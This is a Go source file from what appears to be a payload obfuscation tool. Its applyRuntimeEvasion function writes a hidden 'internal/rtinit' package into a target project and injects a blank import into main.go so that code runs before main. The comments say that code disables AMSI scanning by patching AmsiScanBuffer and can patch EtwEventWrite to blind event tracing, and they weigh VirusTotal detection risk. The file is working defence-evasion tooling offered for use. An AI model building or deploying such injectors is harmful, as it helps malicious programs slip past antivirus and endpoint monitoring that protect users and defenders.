package main

import (
	_ "embed"
	"fmt"
	"go/parser"
	"go/token"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
)

//go:embed templates/runtime_evasion_windows_template.go
var runtimeEvasionWindowsTemplate string

//go:embed templates/runtime_evasion_other_template.go
var runtimeEvasionOtherTemplate string

// applyRuntimeEvasion generates a self-contained runtime evasion package and
// injects a blank import into the main package so the init() runs before main().
//
// The runtime evasion package implements:
//   - AMSI bypass: patches AmsiScanBuffer to return E_INVALIDARG (always enabled)
//   - ETW patching: patches EtwEventWrite to return immediately (env-gated)
//
// VT note: AMSI bypass has low detection risk — it's a small memory patch.
// ETW patching is more aggressive — gated behind PROBE_ETW_PATCH=1 env var.
//
// The package uses //go:build windows tag — on non-Windows, a no-op stub runs.
func applyRuntimeEvasion(dir string) {
	// Find the main package directory (contains main.go with package main)
	mainPkgDir := ""
	filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		if !strings.HasSuffix(path, ".go") {
			return nil
		}
		if strings.HasSuffix(path, "_test.go") {
			return nil
		}
		if strings.Contains(path, "vendor/") {
			return nil
		}
		if strings.Contains(path, "tools/obfuscate") {
			return nil
		}

		fset := token.NewFileSet()
		f, err := parser.ParseFile(fset, path, nil, parser.PackageClauseOnly)
		if err != nil {
			return nil
		}
		if f.Name != nil && f.Name.Name == "main" {
			if strings.Contains(path, "/cmd/") || strings.HasSuffix(filepath.Dir(path), "cmd") {
				mainPkgDir = filepath.Dir(path)
				return filepath.SkipAll
			}
			if mainPkgDir == "" {
				mainPkgDir = filepath.Dir(path)
			}
		}
		return nil
	})

	if mainPkgDir == "" {
		fmt.Fprintf(os.Stderr, "  RUNTIME: no main package found, skipping\n")
		return
	}

	// Read module path from go.mod for the import path
	modulePath := readModulePath(dir)
	if modulePath == "" {
		fmt.Fprintf(os.Stderr, "  RUNTIME: could not read module path from go.mod, skipping\n")
		return
	}
	rtImportPath := modulePath + "/internal/rtinit"

	// Generate the runtime init package under internal/rtinit/
	rtDir := filepath.Join(dir, "internal", "rtinit")
	os.MkdirAll(rtDir, 0755)

	// Strip template headers and add build tags
	windowsContent := stripTemplateHeader(runtimeEvasionWindowsTemplate)
	windowsContent = "//go:build windows\n\n" + windowsContent

	otherContent := stripTemplateHeader(runtimeEvasionOtherTemplate)
	otherContent = "//go:build !windows\n\n" + otherContent

	os.WriteFile(filepath.Join(rtDir, "rt_windows.go"), []byte(windowsContent), 0644)
	os.WriteFile(filepath.Join(rtDir, "rt_other.go"), []byte(otherContent), 0644)

	// Inject blank import into main.go
	mainGoPath := filepath.Join(mainPkgDir, "main.go")
	injectBlankImport(mainGoPath, rtImportPath)

	fmt.Printf("  RUNTIME: generated internal/rtinit/ package\n")
	fmt.Printf("  RUNTIME: injected blank import into %s\n", mainGoPath)
}